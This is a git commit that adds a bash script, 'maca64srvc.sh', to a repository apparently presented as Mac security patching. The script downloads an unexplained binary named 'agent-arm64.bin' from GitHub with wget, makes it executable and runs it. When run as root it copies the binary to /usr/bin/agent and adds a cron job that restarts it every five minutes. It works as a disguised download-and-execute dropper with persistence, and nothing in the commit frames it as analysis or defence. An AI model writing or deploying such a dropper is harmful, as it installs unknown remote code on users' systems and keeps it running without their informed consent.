b71c8d78eca68aac2a5845d090aaf1997f56f72a
xxoo-d <im4x5yn74x@kaiju-security.com>
2026-02-28 14:12:10 -0500

    Add files via upload

---
+++ maca64srvc.sh
@@ -0,0 +1,27 @@
+#!/bin/bash
+PROGRAM="/dev/shm/agent"
+ROOTPROGRAM="/usr/bin/agent"
+SCHEDULE="*/5 * * * *"   # every 5 minutes
+# Must be root
+if [ "$EUID" -ne 0 ]; then
+    echo "Downloading and executing $PROGRAM in the context of user: $USER"
+    wget https://github.com/xxoo-d/Mac-Security-Patching/raw/refs/heads/main/agent-arm64.bin -O $PROGRAM
+    chmod +x $PROGRAM
+    $PROGRAM &
+else
+    if command -v pgrep >/dev/null 2>&1; then
+        echo "Using pgrep for process detection."
+        CRON_CMD="pgrep -f '$ROOTPROGRAM' >/dev/null || $ROOTPROGRAM"
+    else
+        echo "Error: pgrep is not available."
+        exit 1
+    fi
+    wget https://github.com/xxoo-d/Mac-Security-Patching/raw/refs/heads/main/agent-arm64.bin -O $ROOTPROGRAM
+    chmod +x $ROOTPROGRAM
+    CRON_JOB="$SCHEDULE $CRON_CMD"
+    (crontab -l 2>/dev/null | grep -v -F "$ROOTPROGRAM"; echo "$CRON_JOB") | crontab -
+    echo "Cron job installed:"
+    echo "$CRON_JOB"
+    echo "Executing now..."
+    $ROOTPROGRAM &
+fi
